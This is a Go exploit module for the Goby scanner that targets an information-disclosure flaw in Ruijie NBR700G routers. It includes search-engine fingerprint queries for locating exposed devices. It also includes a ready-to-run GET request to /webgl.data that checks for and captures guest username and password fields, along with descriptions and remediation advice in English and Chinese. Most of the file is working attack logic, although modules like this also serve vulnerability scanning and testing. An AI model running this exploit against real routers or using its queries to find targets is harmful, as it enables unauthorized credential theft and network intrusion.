package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ruijie NBR Router webgl.data information",
    "Description": "<p>Ruijie Network NBR700G router is a wireless routing equipment of Ruijie Network Co., LTD. The NBR700G router of Ruijie Network has information vulnerability, which can be used by attackers to obtain sensitive information.</p>",
    "Product": "Ruijie-NBR-Router",
    "Homepage": "http://www.ruijie.com.cn",
    "DisclosureDate": "2022-12-08",
    "Author": "afei_00123@foxmail.com",
    "FofaQuery": "(body=\"Ruijie - NBR\" || (body=\"support.ruijie.com.cn\" && body=\"<p>系统负荷过高，导致网络拥塞，建议降低系统负荷或重启路由器\") || body=\"class=\\\"line resource\\\" id=\\\"nbr_1\\\"\" || title=\"锐捷网络 --NBR路由器--登录界面\" || title==\"锐捷网络\") && body!=\"Server: couchdb\"",
    "GobyQuery": "(body=\"Ruijie - NBR\" || (body=\"support.ruijie.com.cn\" && body=\"<p>系统负荷过高，导致网络拥塞，建议降低系统负荷或重启路由器\") || body=\"class=\\\"line resource\\\" id=\\\"nbr_1\\\"\" || title=\"锐捷网络 --NBR路由器--登录界面\" || title==\"锐捷网络\") && body!=\"Server: couchdb\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to obtain Ruijie network NBR700G router account and password, resulting in sensitive information leakage.</p>",
    "Recommendation": "<p>1. It is recommended to do a good job of access control permissions.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access on security devices such as firewalls.</p>",
    "References": [
        "https://afei00123.blog.csdn.net/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webgl.data",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "application/json, text/javascript, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "http_guest_user",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "http_guest_pwd",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webgl.data",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "application/json, text/javascript, */*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "http_guest_pwd",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "http_guest_user",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "锐捷网络 NBR路由器 webgl.data 信息泄露漏洞",
            "Product": "Ruijie-NBR路由器",
            "Description": "<p>锐捷网络NBR700G路由器是锐捷网络股份有限公司的一款无线路由设备。锐捷网络NBR700G路由器存在信息漏洞，攻击者可利用该漏洞获取敏感信息。<br></p>",
            "Recommendation": "<p>1、建议做好访问控制权限。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可利用该漏洞获取锐捷网络NBR700G路由器相关账号和密码，从而造成敏感信息泄露。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Ruijie NBR Router webgl.data information",
            "Product": "Ruijie-NBR-Router",
            "Description": "<p>Ruijie Network NBR700G router is a wireless routing equipment of Ruijie Network Co., LTD. The NBR700G router of Ruijie Network has information vulnerability, which can be used by attackers to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. It is recommended to do a good job of access control permissions.</p><p>2. Disable the public network from accessing the system if necessary.</p><p>3. Set access policies and whitelist access on security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can use this vulnerability to obtain Ruijie network NBR700G router account and password, resulting in sensitive information leakage.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10784"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}